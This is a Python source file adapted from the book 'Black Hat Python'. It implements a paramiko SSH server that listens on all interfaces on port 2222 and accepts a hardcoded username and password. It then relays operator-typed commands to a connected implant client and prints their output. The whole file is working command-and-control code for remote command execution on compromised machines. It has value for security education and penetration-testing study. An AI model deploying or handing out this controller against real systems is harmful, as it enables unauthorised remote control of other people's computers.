# -*-coding:Utf-8 -*

"""
Code from Black Hat Python v2.
this is a server to use with ssh_rcmd.py

modified:
- change IP to listen on 0.0.0.0
- correct some encoding errors

to improve:
- key management
- server auth
- listening port ip
- use of args
- use of logging instead of print...
- improve except
"""
import os
import paramiko
import socket
import threading


CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa_key'))


class SSHServer (paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanId):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'tim') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL


def main():
    """
    Main function
    """
    server = "0.0.0.0"
    sshPort = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, sshPort))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print(f'[-] Listen failed: {e}')
        exit(1)
    else:
        print(f'Got a client! {client}, {addr}')
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = SSHServer()
    bhSession.start_server(server=server)
    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel!')
        exit(1)
    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh!'.encode('utf-8'))
    try:
        while True:
            command = input("Enter command: ")
            if command != 'exit':
                chan.send(command.encode('utf-8'))
                r = chan.recv(8192)
                print(r.decode('utf-8'))
            else:
                chan.send('exit'.encode('utf-8'))
                print('Exiting!')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()


if __name__ == '__main__':
    main()
